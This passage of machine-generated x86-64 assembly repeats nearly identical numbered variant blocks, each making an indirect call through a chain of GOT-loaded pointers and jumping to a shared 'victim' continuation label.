	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 843
.Lvictim_win0_var843:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 844
.Lvictim_win0_var844:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 845
.Lvictim_win0_var845:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 846
.Lvictim_win0_var846:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 847
.Lvictim_win0_var847:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 848
.Lvictim_win0_var848:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 849
.Lvictim_win0_var849:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 850
.Lvictim_win0_var850:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 851
.Lvictim_win0_var851:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 852
.Lvictim_win0_var852:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 853
.Lvictim_win0_var853:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 854
.Lvictim_win0_var854:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 855
.Lvictim_win0_var855:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 856
.Lvictim_win0_var856:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 857
.Lvictim_win0_var857:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 858
.Lvictim_win0_var858:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 859
.Lvictim_win0_var859:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 860
.Lvictim_win0_var860:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 861
.Lvictim_win0_var861:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 862
.Lvictim_win0_var862:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 863
.Lvictim_win0_var863:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 864
.Lvictim_win0_var864:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 865
.Lvictim_win0_var865:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 866
.Lvictim_win0_var866:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 867
.Lvictim_win0_var867:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 868
.Lvictim_win0_var868:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 869
.Lvictim_win0_var869:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 870
.Lvictim_win0_var870:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 871
.Lvictim_win0_var871:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 872
.Lvictim_win0_var872:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 873
.Lvictim_win0_var873:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 874
.Lvictim_win0_var874:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 875
.Lvictim_win0_var875:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 876
.Lvictim_win0_var876:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 877
.Lvictim_win0_var877:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 878
.Lvictim_win0_var878:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 879
.Lvictim_win0_var879:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 880
.Lvictim_win0_var880:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 881
.Lvictim_win0_var881:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 882
.Lvictim_win0_var882:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 883
.Lvictim_win0_var883:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 884
.Lvictim_win0_var884:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 885
.Lvictim_win0_var885:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 886
.Lvictim_win0_var886:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 887
.Lvictim_win0_var887:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 888
.Lvictim_win0_var888:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 889
.Lvictim_win0_var889:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 890
.Lvictim_win0_var890:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 891
.Lvictim_win0_var891:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 892
.Lvictim_win0_var892:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 893
.Lvictim_win0_var893:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 894
.Lvictim_win0_var894:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 895
.Lvictim_win0_var895:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 896
.Lvictim_win0_var896:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 897
.Lvictim_win0_var897:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 898
.Lvictim_win0_var898:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 899
.Lvictim_win0_var899:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 900
.Lvictim_win0_var900:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 901
.Lvictim_win0_var901:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 902
.Lvictim_win0_var902:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 903
.Lvictim_win0_var903:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 904
.Lvictim_win0_var904:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 905
.Lvictim_win0_var905:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 906
.Lvictim_win0_var906:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 907
.Lvictim_win0_var907:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 908
.Lvictim_win0_var908:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 909
.Lvictim_win0_var909:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 910
.Lvictim_win0_var910:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 911
.Lvictim_win0_var911:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 912
.Lvictim_win0_var912:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 913
.Lvictim_win0_var913:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 914
.Lvictim_win0_var914:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 915
.Lvictim_win0_var915:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 916
.Lvictim_win0_var916:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 917
.Lvictim_win0_var917:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 918
.Lvictim_win0_var918:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 919
.Lvictim_win0_var919:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 920
.Lvictim_win0_var920:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 921
.Lvictim_win0_var921:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 922
.Lvictim_win0_var922:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 923
.Lvictim_win0_var923:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 924
.Lvictim_win0_var924:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 925
.Lvictim_win0_var925:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 926
.Lvictim_win0_var926:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 927
.Lvictim_win0_var927:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 928
.Lvictim_win0_var928:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 929
.Lvictim_win0_var929:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 930
.Lvictim_win0_var930:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 931
.Lvictim_win0_var931:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 932
.Lvictim_win0_var932:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 933
.Lvictim_win0_var933:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 934
.Lvictim_win0_var934:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 935
.Lvictim_win0_var935:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 936
